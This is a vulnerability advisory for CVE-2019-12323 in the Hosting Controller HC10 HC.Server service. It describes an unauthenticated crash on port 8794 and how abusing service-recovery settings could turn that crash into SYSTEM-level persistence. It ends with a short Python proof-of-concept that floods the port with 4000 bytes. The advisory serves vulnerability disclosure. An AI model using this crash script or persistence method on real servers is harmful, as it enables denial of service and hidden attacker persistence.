[Product]
HC10 HC.Server Service 10.14

HC10 is a unified hosting automation control panel for web hosts and Cloud based service providers to manage both Windows & Linux servers
simultaneously as part of a single cluster. HC works on an N-tier user model.


[Vulnerability Type]
Remote Invalid Pointer Write


[CVE Reference]
CVE-2019-12323


[Security Issue]
The HC.Server service in Hosting Controller HC10 10.14 allows an Invalid Pointer Write DoS if attackers can reach the service on port 8794.
In addition this can potentially be leveraged for post exploit persistence with SYSTEM privileges, if physical access or malware is involved.

If a physical attacker or malware can set its own program for the service failure recovery options, it can be used to maintain persistence.
Afterwards, it can be triggered by sending a malicious request to DoS the service, which in turn can start the attackers recovery program.
The attackers program can then try restarting the affected service to try an stay unnoticed by calling "sc start HCServerService".

Services failure flag recovery options for "enabling actions for stops or errors" and can be set in the services "Recovery" properties tab
or on the command line. Authentication is not required to reach the vulnerable service, this was tested successfully on Windows 7/10.

[Exploit/POC]
1) Configure the HCServiceService recovery failure options to an arbitrary program.
2) Trigger the remote invalid pointer write to gain persistence with SYSTEM privileges.

from socket import *

IP = raw_input("[+] HC Server Service IP ")
PORT = 8794

payload = "A"*4000
s=socket(AF_INET,SOCK_STREAM)
s.connect((IP, PORT))
s.send(payload)
s.close()
